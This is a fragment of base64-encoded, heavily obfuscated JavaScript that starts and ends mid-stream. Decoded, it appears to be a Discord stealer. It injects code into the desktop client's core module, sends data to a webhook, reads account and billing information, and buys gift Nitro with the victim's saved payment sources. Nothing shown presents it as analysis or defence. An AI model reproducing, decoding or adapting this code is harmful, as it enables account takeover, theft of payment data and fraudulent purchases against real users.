zUsXzB4NGM1OTVhLF8weDIyNWM3NCksXzB4YzA5NjYyLDB4NWE4Mjc5OTksXzB4NDRmMzAyW18weDMzNzgzY10pO2Vsc2V7aWYoXzB4MzM3ODNjPDB4MjgpXzB4MzliM2NhPV8weDQwMDA4ZChfMHg0Y2ExNmYoXzB4NWQyZTNkLDB4NSksXzB4NDllNzM0KF8weDJmYTNjNSxfMHg0YzU5NWEsXzB4MjI1Yzc0KSxfMHhjMDk2NjIsMHg2ZWQ5ZWJhMSxfMHg0NGYzMDJbXzB4MzM3ODNjXSk7ZWxzZSBfMHgzMzc4M2M8MHgzYz9fMHgzOWIzY2E9XzB4NDAwMDhkKF8weDRjYTE2ZihfMHg1ZDJlM2QsMHg1KSxfMHg1OThlODUoXzB4MmZhM2M1LF8weDRjNTk1YSxfMHgyMjVjNzQpLF8weGMwOTY2MiwweDhmMWJiY2RjLF8weDQ0ZjMwMltfMHgzMzc4M2NdKTpfMHgzOWIzY2E9XzB4NDAwMDhkKF8weDRjYTE2ZihfMHg1ZDJlM2QsMHg1KSxfMHg0OWU3MzQoXzB4MmZhM2M1LF8weDRjNTk1YSxfMHgyMjVjNzQpLF8weGMwOTY2MiwweGNhNjJjMWQ2LF8weDQ0ZjMwMltfMHgzMzc4M2NdKTt9XzB4YzA5NjYyPV8weDIyNWM3NCxfMHgyMjVjNzQ9XzB4NGM1OTVhLF8weDRjNTk1YT1fMHg0Y2ExNmYoXzB4MmZhM2M1LDB4MWUpLF8weDJmYTNjNT1fMHg1ZDJlM2QsXzB4NWQyZTNkPV8weDM5YjNjYTt9cmV0dXJuIF8weDUxYTc0MFsweDBdPV8weDVjYjZmNChfMHg1ZDJlM2QsXzB4NTFhNzQwWzB4MF0pLF8weDUxYTc0MFsweDFdPV8weDVjYjZmNChfMHgyZmEzYzUsXzB4NTFhNzQwWzB4MV0pLF8weDUxYTc0MFsweDJdPV8weDVjYjZmNChfMHg0YzU5NWEsXzB4NTFhNzQwWzB4Ml0pLF8weDUxYTc0MFsweDNdPV8weDVjYjZmNChfMHgyMjVjNzQsXzB4NTFhNzQwWzB4M10pLF8weDUxYTc0MFsweDRdPV8weDVjYjZmNChfMHhjMDk2NjIsXzB4NTFhNzQwWzB4NF0pLF8weDUxYTc0MDt9ZnVuY3Rpb24gZmluYWxpemVTSEExKF8weDIzODlhMSxfMHg0M2MzNWEsXzB4NTg1NTc2LF8weDM4ZDMxOCl7Y29uc3QgXzB4NDQwOGVkPV8weDU4N2I2Njt2YXIgXzB4MjVkMzE4LF8weDMxYjhiMSxfMHgxMDc4ZGE7XzB4MTA3OGRhPShfMHg0M2MzNWErMHg0MT4+PjB4OTw8MHg0KSsweGY7d2hpbGUoXzB4MjM4OWExWydsZW5ndGgnXTw9XzB4MTA3OGRhKXtfMHgyMzg5YTFbXzB4NDQwOGVkKDB4MWYzKV0oMHgwKTt9XzB4MjM4OWExW18weDQzYzM1YT4+PjB4NV18PTB4ODA8PDB4MTgtXzB4NDNjMzVhJTB4MjAsXzB4MjM4OWExW18weDEwNzhkYV09XzB4NDNjMzVhK18weDU4NTU3NixfMHgzMWI4YjE9XzB4MjM4OWExW18weDQ0MDhlZCgweDFlYildO2ZvcihfMHgyNWQzMTg9MHgwO18weDI1ZDMxODxfMHgzMWI4YjE7XzB4MjVkMzE4Kz0weDEwKXtfMHgzOGQzMTg9cm91bmRTSEExKF8weDIzODlhMVtfMHg0NDA4ZWQoMHgxYTkpXShfMHgyNWQzMTgsXzB4MjVkMzE4KzB4MTApLF8weDM4ZDMxOCk7fXJldHVybiBfMHgzOGQzMTg7fWZ1bmN0aW9uIGhleDJiaW5iKF8weDM0MDViMCxfMHg0YmU1NzUsXzB4NGJmYmE3KXtjb25zdCBfMHgzMjk4NDI9XzB4NTg3YjY2O3ZhciBfMHgyNDAzYzUsXzB4MjZhYjJjPV8weDM0MDViMFtfMHgzMjk4NDIoMHgxZWIpXSxfMHg0YjI0YWEsXzB4YTAwNTE1LF8weDVjMTE4NSxfMHgxMDgzZGEsXzB4NTBmZDliO18weDI0MDNjNT1fMHg0YmU1NzV8fFsweDBdLF8weDRiZmJhNz1fMHg0YmZiYTd8fDB4MCxfMHg1MGZkOWI9XzB4NGJmYmE3Pj4+MHgzOzB4MCE9PV8weDI2YWIyYyUweDImJmNvbnNvbGVbXzB4MzI5ODQyKDB4MWFjKV0oJ1N0cmluZ1x4MjBvZlx4MjBIRVhceDIwdHlwZVx4MjBtdXN0XHgyMGJlXHgyMGluXHgyMGJ5dGVceDIwaW5jcmVtZW50cycpO2ZvcihfMHg0YjI0YWE9MHgwO18weDRiMjRhYTxfMHgyNmFiMmM7XzB4NGIyNGFhKz0weDIpe18weGEwMDUxNT1wYXJzZUludChfMHgzNDA1YjBbXzB4MzI5ODQyKDB4MWQ2KV0oXzB4NGIyNGFhLDB4MiksMHgxMCk7aWYoIWlzTmFOKF8weGEwMDUxNSkpe18weDEwODNkYT0oXzB4NGIyNGFhPj4+MHgxKStfMHg1MGZkOWIsXzB4NWMxMTg1PV8weDEwODNkYT4+PjB4Mjt3aGlsZShfMHgyNDAzYzVbXzB4MzI5ODQyKDB4MWViKV08PV8weDVjMTE4NSl7XzB4MjQwM2M1W18weDMyOTg0MigweDFmMyldKDB4MCk7fV8weDI0MDNjNVtfMHg1YzExODVdfD1fMHhhMDA1MTU8PDB4OCooMHgzLV8weDEwODNkYSUweDQpO31lbHNlIGNvbnNvbGVbXzB4MzI5ODQyKDB4MWFjKV0oXzB4MzI5ODQyKDB4MTlkKSk7fXJldHVybnsndmFsdWUnOl8weDI0MDNjNSwnYmluTGVuJzpfMHgyNmFiMmMqMHg0K18weDRiZmJhN307fWNsYXNzIGpzU0hBe2NvbnN0cnVjdG9yKCl7Y29uc3QgXzB4MjlhYTQ4PV8weDU4N2I2Njt2YXIgXzB4MzFhOTkyPTB4MCxfMHg0M2Q4YzA9W10sXzB4MmQ1ZjQ2PTB4MCxfMHg0OWJmYzksXzB4MjM1YjBkLF8weDNkMzY4MyxfMHhkNWIzOTYsXzB4MTIwYTJkLF8weDFkZGE2ZSxfMHg0OWUzOTg9IVtdLF8weDRjMjI5Yj0hW10sXzB4MTQ3ZWE3PVtdLF8weDM0OWI2Yz1bXSxfMHg1ZjIxZWIsXzB4NWYyMWViPTB4MTtfMHgyMzViMGQ9aGV4MmJpbmIsKF8weDVmMjFlYiE9PXBhcnNlSW50KF8weDVmMjFlYiwweGEpfHwweDE+XzB4NWYyMWViKSYmY29uc29sZVtfMHgyOWFhNDgoMHgxYWMpXShfMHgyOWFhNDgoMHgxN2UpKSxfMHhkNWIzOTY9MHgyMDAsXzB4MTIwYTJkPXJvdW5kU0hBMSxfMHgxZGRhNmU9ZmluYWxpemVTSEExLF8weDNkMzY4Mz0weGEwLF8weDQ5YmZjOT1nZXRIKCksdGhpc1tfMHgyOWFhNDgoMHgxNzUpXT1mdW5jdGlvbihfMHg0YjRkOGUpe2NvbnN0IF8weGZiNWU3Nz1fMHgyOWFhNDg7dmFyIF8weDQxNjFiYixfMHg0MzE0OTUsXzB4MTE2NjNmLF8weDI2ZTI1NSxfMHgyZmMyZDQsXzB4MjkxM2NiLF8weDM2MGVjMDtfMHg0MTYxYmI9aGV4MmJpbmIsXzB4NDMxNDk1PV8weDQxNjFiYihfMHg0YjRkOGUpLF8weDExNjYzZj1fMHg0MzE0OTVbXzB4ZmI1ZTc3KDB4MTk4KV0sXzB4MjZlMjU1PV8weDQzMTQ5NVtfMHhmYjVlNzcoMHgxY2YpXSxfMHgyZmMyZDQ9XzB4ZDViMzk2Pj4+MHgzLF8weDM2MGVjMD1fMHgyZmMyZDQvMHg0LTB4MTtpZihfMHgyZmMyZDQ8XzB4MTE2NjNmLzB4OCl7XzB4MjZlMjU1PV8weDFkZGE2ZShfMHgyNmUyNTUsXzB4MTE2NjNmLDB4MCxnZXRIKCkpO3doaWxlKF8weDI2ZTI1NVsnbGVuZ3RoJ108PV8weDM2MGVjMCl7XzB4MjZlMjU1W18weGZiNWU3NygweDFmMyldKDB4MCk7fV8weDI2ZTI1NVtfMHgzNjBlYzBdJj0weGZmZmZmZjAwO31lbHNle2lmKF8weDJmYzJkND5fMHgxMTY2M2YvMHg4KXt3aGlsZShfMHgyNmUyNTVbJ2xlbmd0aCddPD1fMHgzNjBlYzApe18weDI2ZTI1NVsncHVzaCddKDB4MCk7fV8weDI2ZTI1NVtfMHgzNjBlYzBdJj0weGZmZmZmZjAwO319Zm9yKF8weDI5MTNjYj0weDA7XzB4MjkxM2NiPD1fMHgzNjBlYzA7XzB4MjkxM2NiKz0weDEpe18weDE0N2VhN1tfMHgyOTEzY2JdPV8weDI2ZTI1NVtfMHgyOTEzY2JdXjB4MzYzNjM2MzYsXzB4MzQ5YjZjW18weDI5MTNjYl09XzB4MjZlMjU1W18weDI5MTNjYl1eMHg1YzVjNWM1Yzt9XzB4NDliZmM5PV8weDEyMGEyZChfMHgxNDdlYTcsXzB4NDliZmM5KSxfMHgzMWE5OTI9XzB4ZDViMzk2LF8weDRjMjI5Yj0hIVtdO30sdGhpc1tfMHgyOWFhNDgoMHgxM2EpXT1mdW5jdGlvbihfMHgxNzU3ZWEpe2NvbnN0IF8weGY0MTFjNT1fMHgyOWFhNDg7dmFyIF8weDM0ZWEyZixfMHg0M2Q1YTIsXzB4YWQ0NWU3LF8weDI1Mjc0MSxfMHg1NjI0MTksXzB4Y2Q3YWI9MHgwLF8weDIzMTNmNT1fMHhkNWIzOTY+Pj4weDU7XzB4MzRlYTJmPV8weDIzNWIwZChfMHgxNzU3ZWEsXzB4NDNkOGMwLF8weDJkNWY0NiksXzB4NDNkNWEyPV8weDM0ZWEyZltfMHhmNDExYzUoMHgxOTgpXSxfMHgyNTI3NDE9XzB4MzRlYTJmW18weGY0MTFjNSgweDFjZildLF8weGFkNDVlNz1fMHg0M2Q1YTI+Pj4weDU7Zm9yKF8weDU2MjQxOT0weDA7XzB4NTYyNDE5PF8weGFkNDVlNztfMHg1NjI0MTkrPV8weDIzMTNmNSl7XzB4Y2Q3YWIrXzB4ZDViMzk2PD1fMHg0M2Q1YTImJihfMHg0OWJmYzk9XzB4MTIwYTJkKF8weDI1Mjc0MVtfMHhmNDExYzUoMHgxYTkpXShfMHg1NjI0MTksXzB4NTYyNDE5K18weDIzMTNmNSksXzB4NDliZmM5KSxfMHhjZDdhYis9XzB4ZDViMzk2KTt9XzB4MzFhOTkyKz1fMHhjZDdhYixfMHg0M2Q4YzA9XzB4MjUyNzQxWydzbGljZSddKF8weGNkN2FiPj4+MHg1KSxfMHgyZDVmNDY9XzB4NDNkNWEyJV8weGQ1YjM5Njt9LHRoaXNbXzB4MjlhYTQ4KDB4MTMxKV09ZnVuY3Rpb24oKXtjb25zdCBfMHgzMjM3MjE9XzB4MjlhYTQ4O3ZhciBfMHgzNzBmYWI7IVtdPT09XzB4NGMyMjliJiZjb25zb2xlW18weDMyMzcyMSgweDFhYyldKF8weDMyMzcyMSgweDFmMSkpO2NvbnN0IF8weDNmNmJjNT1mdW5jdGlvbihfMHg1MTMyN2Ipe3JldHVybiBiaW5iMmhleChfMHg1MTMyN2IpO307cmV0dXJuIVtdPT09XzB4NDllMzk4JiYoXzB4MzcwZmFiPV8weDFkZGE2ZShfMHg0M2Q4YzAsXzB4MmQ1ZjQ2LF8weDMxYTk5MixfMHg0OWJmYzkpLF8weDQ5YmZjOT1fMHgxMjBhMmQoXzB4MzQ5YjZjLGdldEgoKSksXzB4NDliZmM5PV8weDFkZGE2ZShfMHgzNzBmYWIsXzB4M2QzNjgzLF8weGQ1YjM5NixfMHg0OWJmYzkpKSxfMHg0OWUzOTg9ISFbXSxfMHgzZjZiYzUoXzB4NDliZmM5KTt9O319aWYoXzB4NTg3YjY2KDB4MTZmKT09PXR5cGVvZiBkZWZpbmUmJmRlZmluZVsnYW1kJ10pZGVmaW5lKGZ1bmN0aW9uKCl7cmV0dXJuIGpzU0hBO30pO2Vsc2UgXzB4NTg3YjY2KDB4MWRkKSE9PXR5cGVvZiBleHBvcnRzP18weDU4N2I2NigweDFkZCkhPT10eXBlb2YgbW9kdWxlJiZtb2R1bGVbXzB4NTg3YjY2KDB4MTg3KV0/bW9kdWxlWydleHBvcnRzJ109ZXhwb3J0cz1qc1NIQTpleHBvcnRzPWpzU0hBOmdsb2JhbFtfMHg1ODdiNjYoMHgxNDIpXT1qc1NIQTtqc1NIQVtfMHg1ODdiNjYoMHgxNTQpXSYmKGpzU0hBPWpzU0hBW18weDU4N2I2NigweDE1NCldKTtmdW5jdGlvbiB0b3RwKF8weDQ5ZWI4NSl7Y29uc3QgXzB4NTU2YjlhPV8weDU4N2I2NixfMHgyOWRlNWI9MHgxZSxfMHgyZjE2NTI9MHg2LF8weDRlODlhNj1EYXRlW18weDU1NmI5YSgweDE0NildKCksXzB4MTliMDk1PU1hdGhbJ3JvdW5kJ10oXzB4NGU4OWE2LzB4M2U4KSxfMHg3MjE2NGU9bGVmdHBhZChkZWMyaGV4KE1hdGhbXzB4NTU2YjlhKDB4MWM3KV0oXzB4MTliMDk1L18weDI5ZGU1YikpLDB4MTAsJzAnKSxfMHg1NTcyMjk9bmV3IGpzU0hBKCk7XzB4NTU3MjI5W18weDU1NmI5YSgweDE3NSldKGJhc2UzMnRvaGV4KF8weDQ5ZWI4NSkpLF8weDU1NzIyOVsndXBkYXRlJ10oXzB4NzIxNjRlKTtjb25zdCBfMHgzN2JlMmE9XzB4NTU3MjI5WydnZXRITUFDJ10oKSxfMHg0ZjE4ZDA9aGV4MmRlYyhfMHgzN2JlMmFbXzB4NTU2YjlhKDB4MTRiKV0oXzB4MzdiZTJhW18weDU1NmI5YSgweDFlYildLTB4MSkpO2xldCBfMHgzYjM2MWY9KGhleDJkZWMoXzB4MzdiZTJhW18weDU1NmI5YSgweDFkNildKF8weDRmMThkMCoweDIsMHg4KSkmaGV4MmRlYyhfMHg1NTZiOWEoMHgxNzEpKSkrJyc7cmV0dXJuIF8weDNiMzYxZj1fMHgzYjM2MWZbXzB4NTU2YjlhKDB4MWQ2KV0oTWF0aFtfMHg1NTZiOWEoMHgxYmYpXShfMHgzYjM2MWZbXzB4NTU2YjlhKDB4MWViKV0tXzB4MmYxNjUyLDB4MCksXzB4MmYxNjUyKSxfMHgzYjM2MWY7fWZ1bmN0aW9uIGhleDJkZWMoXzB4NTU1YzhlKXtyZXR1cm4gcGFyc2VJbnQoXzB4NTU1YzhlLDB4MTApO31mdW5jdGlvbiBkZWMyaGV4KF8weDI4OWQzZil7Y29uc3QgXzB4M2VhOWQ3PV8weDU4N2I2NjtyZXR1cm4oXzB4Mjg5ZDNmPDE1LjU/JzAnOicnKStNYXRoW18weDNlYTlkNygweDE3MCldKF8weDI4OWQzZilbJ3RvU3RyaW5nJ10oMHgxMCk7fWZ1bmN0aW9uIGJhc2UzMnRvaGV4KF8weDQxMDM4ZCl7Y29uc3QgXzB4NThjYzFjPV8weDU4N2I2NjtsZXQgXzB4NTQzNzNlPSdBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWjIzNDU2NycsXzB4MmQyMDhhPScnLF8weDQ5NTYyNT0nJztfMHg0MTAzOGQ9XzB4NDEwMzhkW18weDU4Y2MxYygweDE5YildKC89KyQvLCcnKTtmb3IobGV0IF8weDFhYWQ3Zj0weDA7XzB4MWFhZDdmPF8weDQxMDM4ZFtfMHg1OGNjMWMoMHgxZWIpXTtfMHgxYWFkN2YrKyl7bGV0IF8weDVkODY3YT1fMHg1NDM3M2VbJ2luZGV4T2YnXShfMHg0MTAzOGRbXzB4NThjYzFjKDB4MTg0KV0oXzB4MWFhZDdmKVsndG9VcHBlckNhc2UnXSgpKTtpZihfMHg1ZDg2N2E9PT0tMHgxKWNvbnNvbGVbJ2Vycm9yJ10oXzB4NThjYzFjKDB4MTRhKSk7XzB4MmQyMDhhKz1sZWZ0cGFkKF8weDVkODY3YVtfMHg1OGNjMWMoMHgxZDMpXSgweDIpLDB4NSwnMCcpO31mb3IobGV0IF8weDUxODc4Zj0weDA7XzB4NTE4NzhmKzB4ODw9XzB4MmQyMDhhWydsZW5ndGgnXTtfMHg1MTg3OGYrPTB4OCl7bGV0IF8weDRlYWUwOT1fMHgyZDIwOGFbXzB4NThjYzFjKDB4MWQ2KV0oXzB4NTE4NzhmLDB4OCk7XzB4NDk1NjI1PV8weDQ5NTYyNStsZWZ0cGFkKHBhcnNlSW50KF8weDRlYWUwOSwweDIpWyd0b1N0cmluZyddKDB4MTApLDB4MiwnMCcpO31yZXR1cm4gXzB4NDk1NjI1O31mdW5jdGlvbiBsZWZ0cGFkKF8weDM4YTA5OSxfMHgzMDE0YTIsXzB4NDU2ZjAyKXtjb25zdCBfMHg0Njc4MDE9XzB4NTg3YjY2O3JldHVybiBfMHgzMDE0YTIrMHgxPj1fMHgzOGEwOTlbXzB4NDY3ODAxKDB4MWViKV0mJihfMHgzOGEwOTk9QXJyYXkoXzB4MzAxNGEyKzB4MS1fMHgzOGEwOTlbXzB4NDY3ODAxKDB4MWViKV0pWydqb2luJ10oXzB4NDU2ZjAyKStfMHgzOGEwOTkpLF8weDM4YTA5OTt9ZnVuY3Rpb24gXzB4NGJiMChfMHg1YmQ5NWUsXzB4NjdjMWEyKXtjb25zdCBfMHg1YWMwMzA9XzB4NWFjMCgpO3JldHVybiBfMHg0YmIwPWZ1bmN0aW9uKF8weDRiYjAyOCxfMHg4ZjM4MDQpe18weDRiYjAyOD1fMHg0YmIwMjgtMHgxMjI7bGV0IF8weDJjMGYwYj1fMHg1YWMwMzBbXzB4NGJiMDI4XTtyZXR1cm4gXzB4MmMwZjBiO30sXzB4NGJiMChfMHg1YmQ5NWUsXzB4NjdjMWEyKTt9Y29uc3QgZGlzY29yZFBhdGg9KGZ1bmN0aW9uKCl7Y29uc3QgXzB4MzUxNjNmPV8weDU4N2I2NixfMHgxMWFiMjQ9YXJnc1sweDBdW18weDM1MTYzZigweDFjYSldKHBhdGhbXzB4MzUxNjNmKDB4MWM2KV0pW18weDM1MTYzZigweDFhOSldKDB4MCwtMHgxKVsnam9pbiddKHBhdGhbJ3NlcCddKTtsZXQgXzB4MWU2YWZhO2lmKHByb2Nlc3NbXzB4MzUxNjNmKDB4MTIzKV09PT0nd2luMzInKV8weDFlNmFmYT1wYXRoW18weDM1MTYzZigweDE0NCldKF8weDExYWIyNCwncmVzb3VyY2VzJyk7ZWxzZSBwcm9jZXNzW18weDM1MTYzZigweDEyMyldPT09J2RhcndpbicmJihfMHgxZTZhZmE9cGF0aFtfMHgzNTE2M2YoMHgxNDQpXShfMHgxMWFiMjQsXzB4MzUxNjNmKDB4MTQ1KSwnUmVzb3VyY2VzJykpO2lmKGZzW18weDM1MTYzZigweDEzNSldKF8weDFlNmFmYSkpcmV0dXJueydyZXNvdXJjZVBhdGgnOl8weDFlNmFmYSwnYXBwJzpfMHgxMWFiMjR9O3JldHVybnsndW5kZWZpbmVkJzp1bmRlZmluZWQsJ3VuZGVmaW5lZCc6dW5kZWZpbmVkfTt9KCkpO2Z1bmN0aW9uIHVwZGF0ZUNoZWNrKCl7Y29uc3QgXzB4NTcwMzZiPV8weDU4N2I2Nix7cmVzb3VyY2VQYXRoOl8weDQxYTQ0NCxhcHA6XzB4MWQzNWYzfT1kaXNjb3JkUGF0aDtpZihfMHg0MWE0NDQ9PT11bmRlZmluZWR8fF8weDFkMzVmMz09PXVuZGVmaW5lZClyZXR1cm47Y29uc3QgXzB4ZTg0ZDU1PXBhdGhbXzB4NTcwMzZiKDB4MTQ0KV0oXzB4NDFhNDQ0LCdhcHAnKSxfMHg1Y2U0NTA9cGF0aFtfMHg1NzAzNmIoMHgxNDQpXShfMHhlODRkNTUsXzB4NTcwMzZiKDB4MWY3KSksXzB4MTk3ZjU0PXBhdGhbXzB4NTcwMzZiKDB4MTQ0KV0oXzB4ZTg0ZDU1LF8weDU3MDM2YigweDFkYikpLF8weDQ2ZThiYj1mc1tfMHg1NzAzNmIoMHgxNzcpXShfMHgxZDM1ZjMrXzB4NTcwMzZiKDB4MTc4KSlbXzB4NTcwMzZiKDB4MTQ5KV0oXzB4MjMzZDk5PT4vZGlzY29yZF9kZXNrdG9wX2NvcmUtKz8vWyd0ZXN0J10oXzB4MjMzZDk5KSlbMHgwXSxfMHg0MjkwOTk9XzB4MWQzNWYzKydceDVjbW9kdWxlc1x4NWMnK18weDQ2ZThiYitfMHg1NzAzNmIoMHgxNmQpLF8weDE5ZGYyNj1wYXRoWydqb2luJ10ocHJvY2Vzc1snZW52J11bXzB4NTcwMzZiKDB4MWI2KV0sXzB4NTcwMzZiKDB4MTYzKSk7aWYoIWZzW18weDU3MDM2YigweDEzNSldKF8weGU4NGQ1NSkpZnNbXzB4NTcwMzZiKDB4MTljKV0oXzB4ZTg0ZDU1KTtpZihmc1tfMHg1NzAzNmIoMHgxMzUpXShfMHg1Y2U0NTApKWZzW18weDU3MDM2YigweDE3NCldKF8weDVjZTQ1MCk7aWYoZnNbXzB4NTcwMzZiKDB4MTM1KV0oXzB4MTk3ZjU0KSlmc1tfMHg1NzAzNmIoMHgxNzQpXShfMHgxOTdmNTQpO2lmKHByb2Nlc3NbXzB4NTcwMzZiKDB4MTIzKV09PT1fMHg1NzAzNmIoMHgxZjYpfHxwcm9jZXNzW18weDU3MDM2YigweDEyMyldPT09XzB4NTcwMzZiKDB4MWQyKSl7ZnNbJ3dyaXRlRmlsZVN5bmMnXShfMHg1Y2U0NTAsSlNPTltfMHg1NzAzNmIoMHgxMzIpXSh7J25hbWUnOl8weDU3MDM2YigweDE2NiksJ21haW4nOidpbmRleC5qcyd9LG51bGwsMHg0KSk7Y29uc3QgXzB4MTNmMWMwPV8weDU3MDM2YigweDEzOSkrXzB4NDI5MDk5KydceDI3O1x4MGFjb25zdFx4MjBiZFBhdGhceDIwPVx4MjBceDI3JytfMHgxOWRmMjYrXzB4NTcwMzZiKDB4MTQ3KStjb25maWdbXzB4NTcwMzZiKDB4MWI3KV0rJ1x4MjcsXHgyMChyZXMpXHgyMD0+XHgyMHtceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBjb25zdFx4MjBmaWxlXHgyMD1ceDIwZnMuY3JlYXRlV3JpdGVTdHJlYW0oaW5kZXhKcyk7XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwcmVzLnJlcGxhY2UoXHgyNyVXRUJIT09LSEVSRUJBU0U2NEVOQ09ERUQlXHgyNyxceDIwXHgyNycrZW5jb2RlZEhvb2srXzB4NTcwMzZiKDB4MWVkKStjb25maWdbXzB4NTcwMzZiKDB4MTM4KV0rXzB4NTcwMzZiKDB4MTJlKStwYXRoWydqb2luJ10oXzB4NDFhNDQ0LF8weDU3MDM2YigweDE2OSkpK18weDU3MDM2YigweDFkYyk7ZnNbXzB4NTcwMzZiKDB4MTZlKV0oXzB4MTk3ZjU0LF8weDEzZjFjMFtfMHg1NzAzNmIoMHgxOWIpXSgvXFwvZywnXHg1Y1x4NWMnKSk7fWlmKCFmc1tfMHg1NzAzNmIoMHgxMzUpXShwYXRoW18weDU3MDM2YigweDE0NCldKF9fZGlybmFtZSwnaW5pdGlhdGlvbicpKSlyZXR1cm4hMHgwO3JldHVybiBmc1tfMHg1NzAzNmIoMHgxNGQpXShwYXRoW18weDU3MDM2YigweDE0NCldKF9fZGlybmFtZSxfMHg1NzAzNmIoMHgxOGQpKSksZXhlY1NjcmlwdChfMHg1NzAzNmIoMHgxYmEpKSwhMHgxO31jb25zdCBleGVjU2NyaXB0PV8weDFmNGM1Nz0+e2NvbnN0IF8weDRkM2Y0Mz1fMHg1ODdiNjYsXzB4MzIzMDIxPUJyb3dzZXJXaW5kb3dbXzB4NGQzZjQzKDB4MTUyKV0oKVsweDBdO3JldHVybiBfMHgzMjMwMjFbXzB4NGQzZjQzKDB4MWY0KV1bXzB4NGQzZjQzKDB4MWQ3KV0oXzB4MWY0YzU3LCEweDApO30sZ2V0SW5mbz1hc3luYyBfMHgxMzFhMzQ9Pntjb25zdCBfMHg0YzQ2Y2I9XzB4NTg3YjY2LF8weDE4YTZlMT1hd2FpdCBleGVjU2NyaXB0KF8weDRjNDZjYigweDE2NSkrY29uZmlnW18weDRjNDZjYigweDFiYyldK18weDRjNDZjYigweDE2YykrXzB4MTMxYTM0K18weDRjNDZjYigweDEyOSkpO3JldHVybiBKU09OW18weDRjNDZjYigweDE1YildKF8weDE4YTZlMSk7fSxmZXRjaEJpbGxpbmc9YXN5bmMgXzB4MjM2ZWY1PT57Y29uc3QgXzB4MTAyZjI1PV8weDU4N2I2NixfMHhiMDgxNjI9YXdhaXQgZXhlY1NjcmlwdChfMHgxMDJmMjUoMHgxMjYpK2NvbmZpZ1tfMHgxMDJmMjUoMHgxYmMpXStfMHgxMDJmMjUoMHgxZDUpK18weDIzNmVmNStfMHgxMDJmMjUoMHgxOTIpKTtpZighXzB4YjA4MTYyW18weDEwMmYyNSgweDE5MCldfHxfMHhiMDgxNjJbXzB4MTAyZjI1KDB4MWViKV09PT0weDApcmV0dXJuJyc7cmV0dXJuIEpTT05bXzB4MTAyZjI1KDB4MTViKV0oXzB4YjA4MTYyKTt9LGdldEJpbGxpbmc9YXN5bmMgXzB4NDc5ZTM5PT57Y29uc3QgXzB4MmJjYzk0PV8weDU4N2I2NixfMHgyNGNjNmI9YXdhaXQgZmV0Y2hCaWxsaW5nKF8weDQ3OWUzOSk7aWYoIV8weDI0Y2M2YilyZXR1cm4n4p2MJztjb25zdCBfMHgzYWEyMmI9W107XzB4MjRjYzZiW18weDJiY2M5NCgweDFjOSldKF8weGFmMWQ0PT57Y29uc3QgXzB4M2U2MTExPV8weDJiY2M5NDtpZighXzB4YWYxZDRbJ2ludmFsaWQnXSlzd2l0Y2goXzB4YWYxZDRbXzB4M2U2MTExKDB4MTdiKV0pe2Nhc2UgMHgxOl8weDNhYTIyYltfMHgzZTYxMTEoMHgxZjMpXSgn8J+SsycpO2JyZWFrO2Nhc2UgMHgyOl8weDNhYTIyYlsncHVzaCddKF8weDNlNjExMSgweDEyOCkpO2JyZWFrO2RlZmF1bHQ6XzB4M2FhMjJiW18weDNlNjExMSgweDFmMyldKCcoVW5rbm93biknKTt9fSk7aWYoXzB4M2FhMjJiW18weDJiY2M5NCgweDFlYildPT0weDApXzB4M2FhMjJiWydwdXNoJ10oJ+KdjCcpO3JldHVybiBfMHgzYWEyMmJbXzB4MmJjYzk0KDB4MTQ0KV0oJ1x4MjAnKTt9LFB1cmNoYXNlPWFzeW5jKF8weDE2NWViOSxfMHgzMjI1MWQsXzB4MzA1ZDZmLF8weGZlMGZhMSk9Pntjb25zdCBfMHgxZWVkNWI9XzB4NTg3YjY2LF8weDRlOWVlYj17J2V4cGVjdGVkX2Ftb3VudCc6Y29uZmlnW18weDFlZWQ1YigweDE2NCldW18weDMwNWQ2Zl1bXzB4ZmUwZmExXVtfMHgxZWVkNWIoMHgxNTkpXSwnZXhwZWN0ZWRfY3VycmVuY3knOl8weDFlZWQ1YigweDFiOCksJ2dpZnQnOiEhW10sJ3BheW1lbnRfc291cmNlX2lkJzpfMHgzMjI1MWQsJ3BheW1lbnRfc291cmNlX3Rva2VuJzpudWxsLCdwdXJjaGFzZV90b2tlbic6XzB4MWVlZDViKDB4MTM2KSwnc2t1X3N1YnNjcmlwdGlvbl9wbGFuX2lkJzpjb25maWdbJ25pdHJvJ11bXzB4MzA1ZDZmXVtfMHhmZTBmYTFdW18weDFlZWQ1YigweDE4OCldfSxfMHg0NWYxNjc9ZXhlY1NjcmlwdChfMHgxZWVkNWIoMHgxYTgpK2NvbmZpZ1tfMHgxZWVkNWIoMHgxNjQpXVtfMHgzMDVkNmZdW18weGZlMGZhMV1bJ2lkJ10rXzB4MWVlZDViKDB4MTI0KStfMHgxNjVlYjkrXzB4MWVlZDViKDB4MWIyKStKU09OW18weDFlZWQ1YigweDEzMildKF8weDRlOWVlYikrJykpO1x4MGFceDIwXHgyMFx4MjBceDIweG1sSHR0cC5yZXNwb25zZVRleHQnKTtpZihfMHg0NWYxNjdbXzB4MWVlZDViKDB4MTVlKV0pcmV0dXJuIF8weDFlZWQ1YigweDFjMykrXzB4NDVmMTY3W18weDFlZWQ1YigweDE1ZSldO2Vsc2UgcmV0dXJuIG51bGw7fSxidXlOaXRybz1hc3luYyBfMHgzZDljZGI9Pntjb25zdCBfMHgxYzE2ZmQ9XzB4NTg3YjY2LF8weDIxZjM3MT1hd2FpdCBmZXRjaEJpbGxpbmcoXzB4M2Q5Y2RiKSxfMHg1ODI5ZWM9XzB4MWMxNmZkKDB4MTdmKTtpZighXzB4MjFmMzcxKXJldHVybiBfMHg1ODI5ZWM7bGV0IF8weDJiZWRhNj1bXTtfMHgyMWYzNzFbXzB4MWMxNmZkKDB4MWM5KV0oXzB4MWJmMGE2PT57Y29uc3QgXzB4MzI3NWQ0PV8weDFjMTZmZDshXzB4MWJmMGE2WydpbnZhbGlkJ10mJihfMHgyYmVkYTY9XzB4MmJlZGE2W18weDMyNzVkNCgweDE2MCldKF8weDFiZjBhNlsnaWQnXSkpO30pO2ZvcihsZXQgXzB4NDA1ZWVjIGluIF8weDJiZWRhNil7Y29uc3QgXzB4ZTdlMDljPVB1cmNoYXNlKF8weDNkOWNkYixfMHg0MDVlZWMsXzB4MWMxNmZkKDB4MWExKSxfMHgxYzE2ZmQoMHgxY2UpKTtpZihfMHhlN2UwOWMhPT1udWxsKXJldHVybiBfMHhlN2UwOWM7ZWxzZXtjb25zdCBfMHg1MDVkNmM9UHVyY2hhc2UoXzB4M2Q5Y2RiLF8weDQwNWVlYyxfMHgxYzE2ZmQoMHgxYTEpLCdtb250aCcpO2lmKF8